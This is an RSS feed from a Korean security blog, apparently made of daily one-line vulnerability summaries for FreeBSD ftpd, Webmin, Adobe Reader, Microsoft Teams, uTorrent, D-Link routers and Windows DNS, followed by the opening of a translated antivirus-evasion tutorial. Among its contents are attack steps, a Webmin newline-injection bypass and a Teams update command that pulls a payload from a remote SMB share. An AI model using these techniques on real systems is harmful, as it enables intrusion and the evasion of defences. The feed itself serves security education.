<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>hackyboiz</title>
    <link>https://hackyboiz.github.io/</link>
    
    <atom:link href="https://hackyboiz.github.io/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>hack &amp; life</description>
    <pubDate>Tue, 29 Dec 2020 08:38:24 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>[하루한줄] CVE-2020-7468: FreeBSD local privilege escalation</title>
      <link>https://hackyboiz.github.io/2020/12/29/l0ch/2020-12-29/</link>
      <guid>https://hackyboiz.github.io/2020/12/29/l0ch/2020-12-29/</guid>
      <pubDate>Tue, 29 Dec 2020 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.zerodayinitiative.com/blog/2020/12/21/cve-202</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2020/12/21/cve-2020-7468-turning-imprisonment-to-advantage-in-the-freebsd-ftpd-chroot-jail">CVE-2020-7468: TURNING IMPRISONMENT TO ADVANTAGE IN THE FREEBSD FTPD CHROOT JAIL</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>FreeBSD ftpd</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>FreeBSD의 ftp 데몬에서 root 로 권한 상승이 가능한 취약점이 발견되었습니다.</p><p>취약점은 <code>chroot</code> 함수의 로그인 처리 부분의 결함으로 인해 발생합니다.</p><p><code>chroot</code> 함수에서 <code>chdir</code>이 실패할 경우 ftpd는 <code>chroot</code>의 jail에서 새로운 로그인 연결을 기다립니다. 이를 이용해 강제로 <code>chdir</code>이 실패하도록 유도하면 해커가 업로드한 파일을 시스템 파일인 것처럼 속일 수 있습니다.</p><p>취약점의 상세 공격 단계는 다음과 같습니다.</p><ol><li>해커가 FTP 유저 계정으로 로그인합니다.</li><li><code>etc/spwd.db</code> 에 임의의 root 패스워드를 설정해 업로드합니다.</li><li><code>chmod 0</code> 으로 홈 디렉터리에 대한 권한을 변경하고 유저 계정으로 다시 로그인합니다.</li><li>3번으로 인해 로그인 중 <code>chdir</code>이 실패하고 <code>ftpd chroot jail</code> 내부에서 새로운 연결을 기다립니다. 이후 모든 시스템 파일 액세스는 해커 계정의 홈 디렉터리를 기준으로 이루어집니다.</li><li>결과적으로 이후 root로 로그인할 때 해커가 업로드한 <code>etc/spwd.db</code> 의 root 패스워드 테이블을 참조해 패스워드를 검증하고 해커가 root 계정에 접근할 수 있습니다.</li></ol><p>해당 취약점을 악용하면 리버스쉘을 실행시키는 명령어를 포함한 파일을 업로드해 root 권한으로 쉘을 실행하고, chroot jail을 벗어나 임의의 명령어 또한 실행할 수 있습니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/lpe/">lpe</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/FreeBSD/">FreeBSD</category>
      
      <category domain="https://hackyboiz.github.io/tags/local-privilege-escalation/">local privilege escalation</category>
      
      <category domain="https://hackyboiz.github.io/tags/ftpd/">ftpd</category>
      
      <category domain="https://hackyboiz.github.io/tags/chroot/">chroot</category>
      
      
      <comments>https://hackyboiz.github.io/2020/12/29/l0ch/2020-12-29/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2020-35606: Arbitrary Command Execution in Webmin</title>
      <link>https://hackyboiz.github.io/2020/12/28/idioth/2020-12-28/</link>
      <guid>https://hackyboiz.github.io/2020/12/28/idioth/2020-12-28/</guid>
      <pubDate>Mon, 28 Dec 2020 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.pentest.com.tr/exploits/Webmin-1962-PU-Escape</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.pentest.com.tr/exploits/Webmin-1962-PU-Escape-Bypass-Remote-Command-Execution.html">Webmin-1962-PU-Escape-Bypass-Remote-Command-Exectuion</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Wemin 1.962 이하 버전</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Webmin에서 Remote Command Execution 취약점이 발견되었습니다. 해당 취약점을 통해 패키지 업데이트 모듈을 사용할 수 있는 모든 유저가 root 권한으로 arbitrary command를 실행할 수 있습니다. <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-12840">CVE-2019-12840</a>에 대한 필터링은 package name 변수가 system command 안에 직접적으로 들어가므로 URL encoding을 통해 우회할 수 있습니다.(ex. command line을 한 줄 아래에서 실행)</p><p><code>u</code> 파라미터는 <code>update.cgi</code>에서 <code>@pkgs</code> 변수에 들어가서 여러 연산을 수행합니다. <code>update.cgi</code>의 함수들은 <code>package-updates-lib.pl</code>에서 호출되는데, 그중 <code>package_install(package-name, [system], [new-install])</code>은 update system이나 Wemin을 통해 패키지를 설치할 수 있고 업데이트된 패키지 목록을 반환합니다.</p><p>패지키를 설치할 때 CVE-2019-12840에 대한 조치로 <code>s/\\(-)|\\(.)/string/g;</code> 필터링이 걸려있습니다. 패키지 이름은 http request 변수이므로 <code>%0a</code>나 <code>%0c</code> 등을 통해 escape가 가능합니다. 패키지 이름 뒤에 <code>%7c</code> 등으로 pipe나 <code>.</code>을 추가하면 그 부분에 <code>\</code> 백 슬래시가 추가되어 명령 실행이 불가능하지만 <code>%0a%7c</code> 등으로 새로운 command line에서 실행하면 <code>\</code>가 무시되고 정상적으로 arbitrary command execution이 가능합니다.</p><p><a href="https://pentest.com.tr/blog/webmin_pu_escape_bypass_rce.rb">해당 취약점에 대한 Metasploit code</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
      
      <category domain="https://hackyboiz.github.io/tags/command-execution/">command execution</category>
      
      <category domain="https://hackyboiz.github.io/tags/cve-2019-12840/">cve-2019-12840</category>
      
      <category domain="https://hackyboiz.github.io/tags/webmin/">webmin</category>
      
      
      <comments>https://hackyboiz.github.io/2020/12/28/idioth/2020-12-28/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] Adobe Reader UAF vulnerability</title>
      <link>https://hackyboiz.github.io/2020/12/18/l0ch/2020-12-18/</link>
      <guid>https://hackyboiz.github.io/2020/12/18/l0ch/2020-12-18/</guid>
      <pubDate>Fri, 18 Dec 2020 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.zerodayinitiative.com/blog/2020/9/2/cve-2020-</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2020/9/2/cve-2020-9715-exploiting-a-use-after-free-in-adobe-reader">CVE-2020-9715: EXPLOITING A USE-AFTER-FREE IN ADOBE READER</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Adobe Reader </p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Adobe Reader에서 원격 코드 실행까지 가능한 UAF 취약점이 발견되었습니다.</p><p><code>ESObjects</code> 는 Adobe Reader의 <code>EScript</code> 객체입니다. <code>ESObjects</code>를 구성할 때 해당 객체에 대한 포인터가 캐시에 저장됩니다. 동일한 PDDoc구조, 이름을 가진 <code>ESObject</code>를 구성할 때 새로 할당하는 대신 캐시의 <code>ESObject</code> 포인터가 사용되는데, 이때 UAF 취약점이 발생합니다.</p><p><code>ESObject</code>가 할당되고 객체 캐시에 추가될 때 <code>ESString type</code>은 ANSI입니다. 객체 캐시에서 <code>ESObject</code>를 삭제할 때 <code>ESString</code> 값으로 찾아 삭제하는데, 삭제할 항목을 검색할 때  UNICODE로 입력받아 <code>ESString</code> 항목을 찾지 못하게 됩니다. 결과적으로 <code>ESObject</code> 포인터는 삭제되지 않고, 이를 재사용할 수 있습니다.</p><p>해당 취약점은 ArrayBuffer byteLength corruption과 heap spray로 트리거해 RCE가 가능합니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/rce/">rce</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/javascript/">javascript</category>
      
      <category domain="https://hackyboiz.github.io/tags/uaf/">uaf</category>
      
      <category domain="https://hackyboiz.github.io/tags/adobe-reader/">adobe reader</category>
      
      <category domain="https://hackyboiz.github.io/tags/heap-spray/">heap spray</category>
      
      
      <comments>https://hackyboiz.github.io/2020/12/18/l0ch/2020-12-18/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] Microsoft Teams Updater Living off the Land</title>
      <link>https://hackyboiz.github.io/2020/12/17/idioth/2020-12-17/</link>
      <guid>https://hackyboiz.github.io/2020/12/17/idioth/2020-12-17/</guid>
      <pubDate>Thu, 17 Dec 2020 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.trustwave.com/en-us/resources/blogs/spiderlab</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/microsoft-teams-updater-living-off-the-land/">Microsoft Teams Updater Living off the Land</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>MS Teams Updater</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft Teams의 업데이트 프로그램을 lolbas(Living off the land binary and script)로 사용할 수 있습니다. 이전에 존재하던 code execution에 대한 취약점 수정은 URL을 통하여 업데이트 기능을 제한하는 것입니다. 하지만 업데이트 프로그램은 제품 업데이트를 위해 공유/로컬 폴더를 통한 로컬 연결이 가능합니다. 따라서 원격 SMB 공유 폴더를 통해 해당 패치를 우회할 수 있습니다.</p><p>이 취약점을 악용하기 위한 payload를 작성하는 단계는 다음과 같습니다.</p><ol><li><p><code>%localappdata%\Microsoft\Teams\packages</code>에서 Microsoft Teams pre-built package를 통해 nupkg 패키지 추출(ex. Teams-1.3.00.27559-full.nupkg)</p></li><li><p><code>Teams-1.3.00.27559-full.nupkg\lib\net45</code>에 shellcode를 <code>squirrel.exe</code> 파일로 넣은 후 압축</p></li><li><p>metadata 계산</p><p><code>sha1sum Teams-1.3.00.27559-full.nupkg.nupkg &amp;&amp; wc -c &lt; Teams-1.3.00.27559-full.nupkg</code></p><p>output:</p><p><code>fa8b87f0b995498a6e890c832dcaf968997608d4 Teams-1.3.00.27559-full.nupkg 4695</code></p></li><li><p><code>RELEASES</code> 파일을 생성한 후 위의 결과 값을 복사해서 저장</p></li><li><p><code>Teams-1.3.00.27559-full.nupkg</code>와 <code>RELEASES</code> 파일을 메인 디렉터리에 넣고 원격 SMB 서버에 업로드</p></li></ol><p>피해자가 아래 명령어를 통해 해커의 원격 SMB 서버로 update를 진행하면 Microsoft Teams에 의해 다운로드되고 실행됩니다.</p><pre><code class="hljs taggerscript"><span class="hljs-variable">%localappdata%</span><span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\T</span>eams<span class="hljs-symbol">\u</span>pdate.exe --update = <span class="hljs-symbol">\\</span> remoteserver<span class="hljs-symbol">\p</span>ayloadFolder</code></pre>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
      
      <category domain="https://hackyboiz.github.io/tags/lolbin/">lolbin</category>
      
      <category domain="https://hackyboiz.github.io/tags/lolbas/">lolbas</category>
      
      <category domain="https://hackyboiz.github.io/tags/microsoft/">microsoft</category>
      
      <category domain="https://hackyboiz.github.io/tags/teams/">teams</category>
      
      
      <comments>https://hackyboiz.github.io/2020/12/17/idioth/2020-12-17/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2020-8437: uTorrent vulnerability, misparse to RCE</title>
      <link>https://hackyboiz.github.io/2020/12/16/fabu1ous/2020-12-19/</link>
      <guid>https://hackyboiz.github.io/2020/12/16/fabu1ous/2020-12-19/</guid>
      <pubDate>Wed, 16 Dec 2020 10:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://blog.whtaguy.com/2020/09/utorrent-cve-2020-8437-v</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.whtaguy.com/2020/09/utorrent-cve-2020-8437-vulnerability.html">CVE-2020-8437 Vulnerability And Exploit Overview</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>uTorrent &lt;= 3.5.5</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>CVE-2020-8437은 uTorrent의 peer끼리 주고받는 BitTorrent protocol에서 발견된 취약점입니다. BitTorrent protocol을 시작하는 Handshake 페킷에는 bencoded dictionary를 담고 있는 <code>M field</code>가 존재합니다.</p><p>bencoded dictionary는 python dictionary와 매우 유사하며 Key와 Value를 갖습니다. 여기서 중요한 점은 nested(중첩된) dictionary의 존재인데, 즉 Value가 또 다른 하나의 dictionary가 될 수 있습니다. 중첩된 dictionary를 파싱하는 과정에서 발생하는 취약점입니다.</p><pre><code class="hljs Bencoded">d4:keyA 6:valueA4:keyBd5:apple 3:pie6:orange 5:juiceee</code></pre><p>충접된 dictionary를 파싱 할 때 몇 번째 layer에서 파싱하고 있는지를 32bit 크기의 <code>bit field</code>에 기록합니다. layer를 하나 들어갈 때마다 이 bit field에 한 비트씩 플래그를 설정합니다( ex. 2번째 layer 파싱 중 : 0000 0000 0000 0011 ). 만약 layer가 32보다 많이 중첩된 dictionary를 파싱하게 된다면 Crash가 발생합니다.</p><p>malicious bencoded dictionary를 담은 <code>.torrent</code>를 받는 peer의 uTorrent는 nested dictionary를 파싱하는 과정에서 Crash가 발생하고 RCE까지 이어질 수 있습니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/rce/">rce</category>
      
      <category domain="https://hackyboiz.github.io/tags/utorrent/">utorrent</category>
      
      <category domain="https://hackyboiz.github.io/tags/misparse/">misparse</category>
      
      
      <comments>https://hackyboiz.github.io/2020/12/16/fabu1ous/2020-12-19/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] Qualcomm DSP Achilles</title>
      <link>https://hackyboiz.github.io/2020/12/16/fabu1ous/2020-12-16/</link>
      <guid>https://hackyboiz.github.io/2020/12/16/fabu1ous/2020-12-16/</guid>
      <pubDate>Wed, 16 Dec 2020 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://blog.checkpoint.com/2020/08/06/achilles-small-chi</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.checkpoint.com/2020/08/06/achilles-small-chip-big-peril/#:~:text=One%20of%20the%20most%20common,the%20leading%20manufacturers%3A%20Qualcomm%20Technologies">Qualcomm DSP Achilles</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Qualcomm DSP chip</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Checkpoint는 올해 Defcon에서 Achilles라는 연구 논문을 발표했습니다. Achilles는 Qualcomm DSP( Digital Signal Processor ) 칩에서 400개 이상의 취약점을 찾은 퍼징 기술 연구입니다. Qualcomm은 다양한 칩들을 생산하는 회사로, 스마트폰 시장의 40%가 Qualcomm의 칩을 사용하고 있기 때문에 Achilles에 주목해볼 필요가 있습니다.</p><p>DSP 칩들은 기본적으로 Black box로 관리되기 때문에, manufacturer가 아니라면 DSP 칩에 대한 정보가 제한적일 수밖에 없습니다. 이 칩을 사용해 스마트폰을 만드는 제조사도 예외는 아닙니다. Checkpoint는 black box 때문에 스마트폰 제조사들이 신속하게 이슈를 고치지 못하는 상황을 지적했습니다.</p><p>올해 5월 Zerodium이 ios exploit의 제보가 너무 많다는 이유로 구매 중지를 선언했습니다. Open source인 Android 보다 취약점 제보 건수가 많다는 것을 근거로 Closed source(black box)를 유지하던 ios의 보안성은 더 이상 효과 없다는 의견이 있습니다. ios 뿐만 아니라 모든 black box의 의미가 점점 희미해지고 있는 거 같습니다.</p><p>헤커들에겐 black box의 정보 폐쇄 효과는 점점 옅어지고, vendor 입장에선 이슈를 고치지 힘든 상황이 맞물려 Achilles 연구처럼 취약점이 뭉텅이로 나오는 일이 발생했다고 볼 수 있습니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/qualcomm/">qualcomm</category>
      
      <category domain="https://hackyboiz.github.io/tags/dsp/">dsp</category>
      
      
      <comments>https://hackyboiz.github.io/2020/12/16/fabu1ous/2020-12-16/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2020-8863/8864 D-LINK ROUTER AUTHENTICATION BYPASSES</title>
      <link>https://hackyboiz.github.io/2020/12/15/l0ch/2020-12-15/</link>
      <guid>https://hackyboiz.github.io/2020/12/15/l0ch/2020-12-15/</guid>
      <pubDate>Tue, 15 Dec 2020 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.zerodayinitiative.com/blog/2020/9/30/the-anat</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2020/9/30/the-anatomy-of-a-bug-door-dissecting-two-d-link-router-authentication-bypasses">THE ANATOMY OF A BUG DOOR: DISSECTING TWO D-LINK ROUTER AUTHENTICATION BYPASSES</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>D-LINK router</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>HNAP (Home Network Administration Protocol)는 Pure Networks Inc. 에서 개발 한 독점 SOAP 기반 프로토콜입니다. 현재는 이 프로토콜의 사용이 중단되었지만 여전히 업데이트되지 않은 많은 라우터들이 해당 프로토콜을 사용하고 있습니다.</p><p>HNAP에서 발견된 두 가지 취약점은 다음과 같습니다.</p><p>CVE-2020-8863은 <code>LoginPassword</code> 검증 과정에서 발생하는 authentication bypass 취약점입니다. <code>strncmp()</code> 에서 db 패스워드와 클라이언트가 입력한 <code>LoginPassword</code>를 <code>LoginPassword</code>의 size 만큼 비교하는데, 이때 <code>LoginPassword</code>에 빈 값을 전달하면 비교할 size가 0이 되어 무조건 인증에 성공하게 됩니다.</p><p>CVE-2020-8864는 HNAP PrivateLogin 인증 알고리즘의 잘못된 구현으로 인해 발생하는 authentication bypass 취약점입니다. HNAP를 통해 인증할 때 서버는 일반적으로 Private key를 사용자의 암호를 기반으로 생성합니다. 그러나 로그인 요청 중 <code>PrivateLogin</code> 필드에 “Username” 값을 넣어 요청하면 “Username”값으로 Private key를 생성해  실제 관리자 암호를 몰라도 인증 챌린지 값을 알 수 있습니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/authentication-bypass/">authentication bypass</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/router/">router</category>
      
      <category domain="https://hackyboiz.github.io/tags/bug-door/">bug-door</category>
      
      <category domain="https://hackyboiz.github.io/tags/d-link/">d-link</category>
      
      
      <comments>https://hackyboiz.github.io/2020/12/15/l0ch/2020-12-15/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] Windows Server DNS Resolver Spoofing 취약점 권고</title>
      <link>https://hackyboiz.github.io/2020/12/14/idioth/2020-12-14/</link>
      <guid>https://hackyboiz.github.io/2020/12/14/idioth/2020-12-14/</guid>
      <pubDate>Mon, 14 Dec 2020 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://dirteam.com/sander/2020/12/10/dns-spoofing-vulner</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://dirteam.com/sander/2020/12/10/dns-spoofing-vulnerability-sad-dns-important-cve-2020-25705-adv200013/">Spoofing Vulnerability in DNS Resolver (SAD DNS, Important, CVE-2020-25705, ADV200013)</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows Server 2008 R2</li><li>Windows Server 2012</li><li>Windows Server 2012 R2</li><li>Windows Server 2016</li><li>Windows Server 2019</li><li>Windows Server, version 1903</li><li>Windows Server, version 1909</li><li>Windows Server, version 2004</li><li>Windows Server, version 20H2</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>2020년 12월 8일에 마이크로소프트에서 DNS Resolver addressing spoofing 취약점에 대한 보안 공지(<a href="https://msrc.microsoft.com/update-guide/vulnerability/ADV200013">ADV200013</a>)가 발표됐습니다. 마이크로소프트는 해당 취약점을 통한 DNS cache poisoning attack을 막기 위해 DNS UDP 패킷의 크기를 제한하는 권고를 했습니다.</p><p>해당 취약점은 Windows TCP/IP stack에 제공되는 DNS Resolver Component에 존재합니다. DNS Resolver에 영향을 미치는 IP 조각화에 의해 DNS cache poisoning 취약점이 발생하며 해당 취약점을 exploit 한 해커는 DNS forwarder나 DNS Resolver에 의해 cache 된 DNS packet을 스푸핑 할 수 있습니다. 취약점을 성공적으로 exploit 하면 해커는 수정된 DNS record를 사용하여 해커의 웹사이트로 redirect 시킬 수 있습니다.</p><p>해당 취약점을 방지하기 위해 <code>MaximumUdpPacketSize</code> 레지스트리 값을 1,221 bytes로 수정해야 합니다. 수정된 후 DNS Resolver는 1,221 bytes보다 큰 모든 response를 TCP로 받아서 Windows Server 기반 DNS server에서 해당 취약점을 악용하려는 시도를 막을 수 있습니다.</p><p>DNS server가 실행되는 모든 Windows Server에서 관리자 권한 파워 쉘이나 원격 세션을 통한 아래의 명령줄을 실행하면 UDP 패킷 크기의 레지스트리 값을 변경할 수 있습니다.</p><pre><code class="hljs powershell"><span class="hljs-variable">$RegPath</span> = <span class="hljs-string">&quot;HKLM:\System\CurrentControlSet\Services\DNS\Parameters&quot;</span><span class="hljs-built_in">New-ItemProperty</span> <span class="hljs-literal">-Path</span> <span class="hljs-variable">$RegPath</span> <span class="hljs-literal">-Name</span> MaximumUdpPacketSize `<span class="hljs-literal">-Value</span> <span class="hljs-number">1221</span> <span class="hljs-literal">-PropertyType</span> DWORD <span class="hljs-literal">-Force</span><span class="hljs-built_in">Restart-Service</span> DNS</code></pre>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
      
      <category domain="https://hackyboiz.github.io/tags/sad-dns/">sad dns</category>
      
      <category domain="https://hackyboiz.github.io/tags/dns-cache-poisoning/">dns cache poisoning</category>
      
      <category domain="https://hackyboiz.github.io/tags/dns-resolver/">dns resolver</category>
      
      <category domain="https://hackyboiz.github.io/tags/windows-server/">windows server</category>
      
      <category domain="https://hackyboiz.github.io/tags/adv200013/">adv200013</category>
      
      
      <comments>https://hackyboiz.github.io/2020/12/14/idioth/2020-12-14/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Translation] Engineering Antivirus evasion Part.2</title>
      <link>https://hackyboiz.github.io/2020/12/13/idioth/av_evasion_part2/</link>
      <guid>https://hackyboiz.github.io/2020/12/13/idioth/av_evasion_part2/</guid>
      <pubDate>Sun, 13 Dec 2020 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;저번에 올렸던 Engineering Antivirus evasion를 이어서 Part 2의 번역본도 들고 왔습니다.&lt;/p&gt;
&lt;p&gt;저번의 발 번역에 이어서 이번에도 의역과 오역이 난무하는 글이므로 글이 이해가 안 되시거나 얘가 왜 이렇게 썼는지 이</description>
        
      
      
      
      <content:encoded><![CDATA[<p>저번에 올렸던 Engineering Antivirus evasion를 이어서 Part 2의 번역본도 들고 왔습니다.</p><p>저번의 발 번역에 이어서 이번에도 의역과 오역이 난무하는 글이므로 글이 이해가 안 되시거나 얘가 왜 이렇게 썼는지 이해가 안 되시는 부분이 있으시면 바로 지적해주시기 바랍니다!</p><blockquote><p>원문글 : <a href="https://blog.scrt.ch/2020/07/15/engineering-antivirus-evasion-part-ii/">Engineering antivirus evasion (Part II)</a></p></blockquote><p><strong>tl;dr</strong> 소프트웨어는 Windows 운영 체제와 상호 작용하기 위해 동적 링크 라이브러리(DLL)를 통해 함수를 가져온다. 이 함수들은 Import Address Table 테이블에 평문으로 작성되고 안티바이러스 소프트웨어는 이를 활용하여 악의적인 활동을 탐지한다. 우리는 Meterpreter를 중심으로 C/C++ 소프트웨어를 refactoring 하여 이러한 footprint를 제거할 수 있는 난독화 아이디어와 구현을 보여준다. 소스 코드는 <a href="https://github.com/scrt/avcleaner">https://github.com/scrt/avcleaner</a>에서 확인할 수 있다.</p><h2 id="소개"><a href="#소개" class="headerlink" title="소개"></a>소개</h2><p>이전 글에서 정규식을 사용하지 않고 소스 코드에서 문자열 리터럴을 바꾸는 방법을 보여줬다. 바이너리의 footprint를 줄이고 정적 시그니처에 의존하는 보안 소프트웨어를 우회하는 것이 목적이다.</p><p>그러나 소스 코드의 문자열 리터럴 말고도 정적으로 수집하고 분석할 수 있는 정보들이 많다. 이 글은 바이너리에서 API import를 숨기는 방법과 C/C++로 작성된 모든 소프트웨어에서 그 작업을 자동화하는 방법에 대해서 다룰 것이다.</p><h2 id="API-imports의-문제점"><a href="#API-imports의-문제점" class="headerlink" title="API imports의 문제점"></a>API imports의 문제점</h2><p>간단한 C 프로그램을 아래와 같이 작성하고 빌드하자</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv)</span> </span>&#123;     MessageBox(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;Test&quot;</span>, <span class="hljs-string">&quot;Something&quot;</span>, MB_OK);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>그리고 가장 좋아하는 컴파일러로 빌드해라. MinGW는 <em>macOS</em>에서 <em>Windows</em>로 크로스 빌드를 하는 데 사용된다.</p><pre><code class="hljs bash">x86_64-w64-mingw32-gcc test.c -o /tmp/toto.exe</code></pre><p>그 후에 rabin2(radare2에 포함되어 있음) 또는 GNU strings 유틸리티를 사용하여 문자열을 리스트 할 수 있다.</p><pre><code class="hljs bash">rabin2 -zz /tmp/toto.exe | bat</code></pre><pre><code class="hljs bash"> 205   │ 201  0x00003c92 0x00408692 7   8    .idata        ascii   strncmp 206   │ 202  0x00003c9c 0x0040869c 8   9    .idata        ascii   vfprintf 